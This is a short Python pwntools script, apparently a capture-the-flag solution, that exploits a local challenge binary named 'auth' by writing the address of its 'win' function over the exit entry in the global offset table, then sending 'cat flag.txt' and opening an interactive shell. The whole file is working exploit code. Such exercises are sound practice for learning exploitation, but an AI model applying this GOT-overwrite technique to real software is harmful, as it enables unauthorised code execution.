#!/usr/bin/python
from pwn import *
from time import sleep

auth = ELF('./auth')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')     # libc name



s = process('./auth')
win_func = str(hex(auth.symbols['win']))
got = str(hex(auth.got['exit']))
log.info('Global Offset: {}'.format(got))
log.info('Win Function: {}'.format(win_func))
print s.recv()

s.sendline(got)
sleep(1)
print s.recv()

s.sendline(win_func)
s.sendline('cat flag.txt')
s.interactive()
s.close()
